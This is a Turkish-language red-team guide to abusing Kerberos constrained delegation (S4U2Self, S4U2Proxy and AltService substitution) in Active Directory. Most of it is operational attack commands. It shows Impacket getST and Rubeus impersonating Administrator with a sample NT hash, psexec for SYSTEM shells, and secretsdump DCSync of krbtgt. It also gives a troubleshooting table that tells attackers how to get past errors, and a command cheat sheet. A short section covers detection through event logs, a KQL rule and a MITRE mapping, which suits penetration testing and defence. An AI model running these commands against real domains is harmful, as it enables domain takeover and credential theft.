## 1. Genel Bakış ve S4U Uzantıları Mimarisi

Unconstrained Delegation'ın yarattığı kontrolsüz güvenlik risklerini (herhangi bir sunucuya her kullanıcının TGT'sinin iletilmesi) sınırlamak amacıyla Microsoft, Windows Server 2003 ile birlikte **Constrained (Kısıtlanmış) Delegation** mekanizmasını tanıttı.

Constrained Delegation mimarisinde bir servis hesabı, yalnızca Active Directory'de yöneticinin belirlediği hedef SPN listesine (`msDS-AllowedToDelegateTo`) kullanıcı adına bağlanabilir. Ancak bu sınır bir güvenlik bariyeri değildir:
- Kerberos Protokol Uzantıları olan **S4U2Self (Service for User to Self)** ve **S4U2Proxy (Service for User to Proxy)** kullanılarak;
- Kontrol edilen servis hesabı adına KDC'den **herhangi bir etki alanı kullanıcısı (Domain Admin dahil)** adına sahte servis bileti üretilebilir.
- Bu bilet izin verilen hedef servise sunularak hedef makine tam yetkiyle (SYSTEM / Local Admin) ele geçirilir.

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                 CONSTRAINED DELEGATION VE S4U ÇALIŞMA MİMARİSİ              │
└─────────────────────────────────────────────────────────────────────────────┘
                                      │
                                      ▼
           [1. S4U2Self Aşaması (Protokol Geçişi - Protocol Transition)]
           - Saldırgan elindeki svc-web kimliğiyle KDC'ye TGS-REQ gönderir
           - "Administrator benim web servisime giriş yaptı, onun adına ST ver"
           - KDC, Administrator ──▶ svc-web için FORWARDABLE ST üretir
                                      │
                                      ▼
           [2. S4U2Proxy Aşaması (Yetkili Hedefe Delegasyon)]
           - Saldırgan elindeki Administrator ST'sini KDC'ye sunar
           - "Bu kullanıcının yetkisiyle msDS-AllowedToDelegateTo'daki SQL01'e gitmek istiyorum"
           - KDC, Administrator ──▶ CIFS/SQL01.corp.local için Service Ticket (TGS) üretir
                                      │
                                      ▼
           [3. Servis Sınıfı Değiştirme (AltService Hilesi)]
           - SPN CIFS/SQL01 olsa dahi Kerberos oturum anahtarı host düzeyindedir
           - CIFS yerine WMI (HOST), WinRM (HTTP) veya DCSync (LDAP) bileti türetilir
                                      │
                                      ▼
           [4. Hedef Sistemde Tam Yetkili Oturum Açma]
           - Üretilen TGS ile hedef sunucuda SYSTEM yetkisinde komut yürütülür
```

### 1.1 Delegasyon Türleri ve Protokol Geçişi (Protocol Transition)

| Delegasyon Yapılandırması | UAC Bayrağı / Öznitelik | Sömürü Yeteneği ve Kısıtlar |
|---|---|---|
| **Protocol Transition (Herhangi Bir Kimlik Doğrulama)** | `TRUSTED_TO_AUTH_FOR_DELEGATION` (`0x1000000`) | **Tam Sömürü:** Kullanıcı Kerberos ile gelmese dahi S4U2Self forwardable bilet üretir. İstenilen kullanıcı taklit edilir. |
| **Kerberos Only (Yalnızca Kerberos)** | UAC'de bayrak yok; yalnızca `msDS-AllowedToDelegateTo` dolu | S4U2Self forwardable bilet vermez. Kullanıcının gerçekten Kerberos ile bağlanması veya **Bronze Bit ([06.4](./06.4_Bronze_Bit.md))** gerekir. |
| **Protected Users / NOT_DELEGATED** | `USER_NOT_DELEGATED` (`0x100000`) | Hedef kullanıcı taklit edilemez; KDC forwardable bayrağını reddeder. |

## 2. Derinlemesine Teknik Mekanizmalar

### 2.1 S4U2Self ve S4U2Proxy Paket Protokolü (MS-SFU)
1. **S4U2Self (MS-SFU 3.1):** Bir servisin, harici bir mekanizmayla (örneğin NTLM, form veya sertifika) kimliğini doğrulayan bir kullanıcı adına yerel yetki kontrolü yapabilmesi için KDC'den kendi adına Service Ticket almasını sağlar.
2. **S4U2Proxy (MS-SFU 3.2):** Servisin, S4U2Self ile aldığı Service Ticket'ı kanıt olarak kullanarak `msDS-AllowedToDelegateTo` listesindeki bir arka uç servisi için yeni bir Service Ticket talep etmesine izin verir.

### 2.2 AltService Hilesi (Service Class Substitution)
Active Directory'de `msDS-AllowedToDelegateTo` özniteliği belirli bir servis sınıfı (`CIFS/SQL01.corp.local`) ile kısıtlanmış olsa bile, KDC bilet üretiminde yalnızca **hedef bilgisayar hesabının (sAMAccountName)** anahtarını kullanır. Servis sınıfı (SPN öneki: `CIFS`, `HOST`, `HTTP`, `LDAP`, `WSMAN`, `RPCSS`) biletin şifrelenmesinde bir etken değildir.
- Saldırgan `CIFS/SQL01` iznine sahipken;
- Bilet içerisindeki SPN alanını istemci tarafında `HOST/SQL01` (WMI/PsExec) veya `HTTP/SQL01` (WinRM) olarak değiştirebilir.
- Eğer hedef bir Domain Controller ise `LDAP/DC01` bileti türetilerek doğrudan **DCSync** yapılabilir.

## 3. Pratik Sömürü Senaryoları ve Araç Kullanımı

### Senaryo 1: Active Directory'de Constrained Delegation Tanımlı Hesapları Bulma
```powershell
# PowerView ile Protocol Transition açık hesapları listele
Get-DomainUser -TrustedToAuth | Select samaccountname, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | Select samaccountname, msds-allowedtodelegateto
```
```bash
# Linux üzerinden NetExec ile tarama
nxc ldap 10.10.10.5 -u jdoe -p 'Welcome123!' --find-delegation
```

### Senaryo 2: Impacket getST ile Linux Üzerinden S4U2Proxy Sömürüsü
```bash
# svc-web hesabı üzerinden Administrator taklit edilerek CIFS/SQL01 bileti alma
impacket-getST -spn CIFS/SQL01.corp.local -impersonate Administrator -hashes :28f98e0c5e63078b8474ba0c4d5d7476 corp.local/svc-web -dc-ip 10.10.10.5

# Alınan bileti ortam değişkenine aktarma ve PsExec ile hedefte SYSTEM shell alma
export KRB5CCNAME=Administrator@CIFS_SQL01.corp.local.ccache
impacket-psexec -k -no-pass corp.local/Administrator@SQL01.corp.local
```

### Senaryo 3: Rubeus ile Windows Belleğinde S4U Zinciri ve AltService
```cmd
:: svc-web hash'i ile administrator taklit edilerek CIFS, HOST ve HTTP biletleri üretip belleğe enjekte etme
Rubeus.exe s4u /user:svc-web /rc4:28f98e0c5e63078b8474ba0c4d5d7476 /impersonateuser:Administrator /msdsspn:CIFS/SQL01.corp.local /altservice:HOST,HTTP /ptt

:: Bellekteki bilet ile SQL01 C$ paylaşımına erişim
dir \\SQL01.corp.local\C$
```

### Senaryo 4: Hedef DC Olduğunda AltService ile LDAP ve DCSync İcrası
```bash
# CIFS/DC01 iznine sahip hesapla LDAP SPN'i için bilet türetme
impacket-getST -spn CIFS/DC01.corp.local -altservice LDAP -impersonate Administrator -hashes :<NTHASH> corp.local/svc-app -dc-ip 10.10.10.5

# Türetilen LDAP bileti ile DCSync çalıştırma
export KRB5CCNAME=Administrator@LDAP_DC01.corp.local.ccache
impacket-secretsdump -k -no-pass -just-dc-user krbtgt @DC01.corp.local
```

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata / İstisna Mesajı | Kök Neden Analizi | Kesin Çözüm ve Operasyonel Adım |
|---|---|---|
| `KDC_ERR_BADOPTION (Ticket not forwardable)` | Hedefte Protocol Transition kapalı (Kerberos Only) veya taklit edilmek istenen hesap `Protected Users` grubunda. | Korumasız bir kullanıcıyı taklit edin veya sistem yamasız ise **Bronze Bit (CVE-2020-17049)** istismarını uygulayın. |
| `KDC_ERR_S_PRINCIPAL_UNKNOWN` | `msDS-AllowedToDelegateTo` listesindeki SPN etki alanı DNS veya Active Directory dizininde bulunamadı. | SPN dizesinde FQDN yazımını teyit edin (`CIFS/SQL01.corp.local`). Kısa NetBIOS adı (`CIFS/SQL01`) DNS çözümleme hatası verebilir. |
| `KRB_AP_ERR_NOT_US (Incorrect target)` | AltService ile değiştirilen servis sınıfı hedef sunucu üzerinde geçerli bir SPN eşleşmesine sahip değil. | Hedef host üzerinde kayıtlı SPN sınıflarını `Get-DomainUser -Identity target -Properties serviceprincipalname` ile listeleyin. |
| `A_PATH_NOT_FOUND on PsExec` | Bilet başarıyla alındı ancak hedef makinede SMB paylaşımı (`ADMIN$`) güvenlik duvarı tarafından engelleniyor. | WinRM veya WMI portlarını deneyin; AltService ile `HTTP/SQL01` türeterek `evil-winrm -r corp.local` ile bağlanın. |
| `KRB_AP_ERR_SKEW (Clock skew too great)` | Saldırgan sistemi ile Domain Controller arasındaki saat farkı 5 dakikadan fazla. | Saldırgan makinesinde saati DC ile senkronize edin: `rdate -n 10.10.10.5` veya `net time \\10.10.10.5 /set /y`. |
| `Kerberos Preauth Failed for Delegating Account` | Delegasyonu tetikleyen servis hesabının sağlanan NT hash'i veya parolası güncel değil. | Servis hesabının kimlik bilgilerini doğrulayın (`nxc smb 10.10.10.5 -u svc-web -H <hash>`). |

## 5. OPSEC ve Karşı Tespit (IOC & Telemetry)

### 5.1 Olay Günlüğü İmzaları (Windows Security Logs)
- **Event ID 4769 (Kerberos Service Ticket Talebi):** S4U2Self ve S4U2Proxy adımlarında ardışık iki adet 4769 kaydı düşer:
  1. İlk 4769: `ServiceName` = svc-web, `TargetUserName` = Administrator (S4U2Self).
  2. İkinci 4769: `ServiceName` = CIFS/SQL01, `TargetUserName` = Administrator, **`Transited Services` alanı dolu** (S4U2Proxy).
- **Event ID 4624 (Logon Type 3 - Network):** Hedef sistemde taklit edilen kullanıcı adına gerçekleşen ağ oturum açma olayı.
- **Transited Services Telemetrisi:** Normal bilet taleplerinde `Transited Services` alanı boş kalırken, kısıtlı delegasyon işlemlerinde ara servis adı burada açıkça listelenir.

### 5.2 SIEM / EDR Tespit Kuralı (KQL / Sigma)
```kql
// KQL: S4U2Proxy İstismarı ve Transited Services Tespiti
SecurityEvent
| where EventID == 4769
| where isnotempty(TransitedServices)
| project TimeGenerated, Computer, TargetUserName, ServiceName, TicketOptions, TicketEncryptionType, TransitedServices, IpAddress
```

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Operasyonel Kullanım Aşaması |
|---|---|---|
| **T1558.003** | Steal or Forge Kerberos Tickets: Kerberoasting / Delegation | S4U2Self ve S4U2Proxy ile keyfi servis bileti üretimi. |
| **T1550.003** | Use Alternate Authentication Material: Pass the Ticket | Üretilen TGS bileti ile hedef sistemlere kimlik doğrulama. |
| **T1078.002** | Valid Accounts: Domain Accounts | Domain Admin kimliğine bürünülerek yönetimsel eylemler icra etme. |
| **T1003.006** | OS Credential Dumping: DCSync | AltService LDAP biletiyle etki alanı hash veritabanının çekilmesi. |

## 6. Hızlı Referans / Cheat Sheet

### Komut 1: Impacket getST ile S4U Bilet Talebi (Linux)
```bash
impacket-getST -spn CIFS/SQL01.corp.local -impersonate Administrator -hashes :28f98e0c5e63078b8474ba0c4d5d7476 corp.local/svc-web -dc-ip 10.10.10.5
```
- **Ne Yapar?** `svc-web` hesabı üzerinden Administrator taklit edilerek `CIFS/SQL01` için Service Ticket alır ve `.ccache` dosyasına yazar.
- **Ne Zaman Kullanılır?** Constrained delegation tanımlı bir hesabın hash'i bilindiğinde hedefte yerel admin olmak için.
- **Parametreler:** `-spn`: Hedef SPN; `-impersonate`: Taklit edilecek kullanıcı; `-hashes`: Servis hesabının NT hash'i.

### Komut 2: getST ile AltService Kullanarak Farklı Servis Sınıfı Üretme
```bash
impacket-getST -spn CIFS/SQL01.corp.local -altservice HOST -impersonate Administrator -hashes :<NTHASH> corp.local/svc-web -dc-ip 10.10.10.5
```
- **Ne Yapar?** CIFS iznini kullanarak arka uçta WMI ve DCOM için gerekli `HOST/SQL01` biletini türetir.
- **Ne Zaman Kullanılır?** SMB portu (445) kapalı olduğunda WMI üzerinden kod çalıştırmak için.
- **Parametreler:** `-altservice HOST`: SPN önekini HOST olarak değiştirir.

### Komut 3: Rubeus ile Tek Komutta S4U ve Belleğe Enjeksiyon (Windows)
```cmd
Rubeus.exe s4u /user:svc-web /rc4:<NTHASH> /impersonateuser:Administrator /msdsspn:CIFS/SQL01.corp.local /ptt
```
- **Ne Yapar?** Bellek içinde S4U2Self ve S4U2Proxy isteklerini zincirleyerek hedef bileti oturumun LSA önbelleğine yükler.
- **Ne Zaman Kullanılır?** Windows pivot makinesinde diske bilet dosyası yazmadan anında bilet kullanmak için.
- **Parametreler:** `/user`: Servis hesabı; `/rc4`: NT hash; `/impersonateuser`: Hedef kullanıcı; `/ptt`: Pass-the-Ticket.

### Komut 4: PowerView ile Protocol Transition Tanımlı Hesapları Bulma
```powershell
Get-DomainUser -TrustedToAuth | Select samaccountname, msds-allowedtodelegateto
```
- **Ne Yapar?** `TRUSTED_TO_AUTH_FOR_DELEGATION` bayrağı aktif olan ve keyfi kullanıcı taklidi yapabilen hesapları listeler.
- **Ne Zaman Kullanılır?** Dizin keşfi aşamasında doğrudan sömürülebilecek kısıtlı delegasyon hedeflerini saptamak için.
- **Parametreler:** `-TrustedToAuth`: Protocol Transition bayrağını filtreler.

### Komut 5: Alınan Bilet ile PsExec Üzerinden SYSTEM Erişimi
```bash
export KRB5CCNAME=Administrator.ccache && impacket-psexec -k -no-pass corp.local/Administrator@SQL01.corp.local
```
- **Ne Yapar?** S4U ile türetilen bilet dosyasını kullanarak hedef makinede SYSTEM yetkisinde etkileşimli komut satırı başlatır.
- **Ne Zaman Kullanılır?** Bilet üretimi tamamlandıktan sonra nihai yanal hareket yürütmesinde.
- **Parametreler:** `-k`: Kerberos doğrulama; `-no-pass`: Parola sormaz.

### Komut 6: AltService ile LDAP Üzerinden DCSync İcrası
```bash
export KRB5CCNAME=Administrator@LDAP.ccache && impacket-secretsdump -k -no-pass -just-dc @DC01.corp.local
```
- **Ne Yapar?** Hedef DC için türetilen LDAP biletiyle etki alanı parola özetlerini çeker.
- **Ne Zaman Kullanılır?** Delegasyon hedefi bir Domain Controller olduğunda domain yönetimini tek hamlede almak için.
- **Parametreler:** `-just-dc`: Yalnızca etki alanı yöneticileri ve krbtgt hash'lerini dökümler.
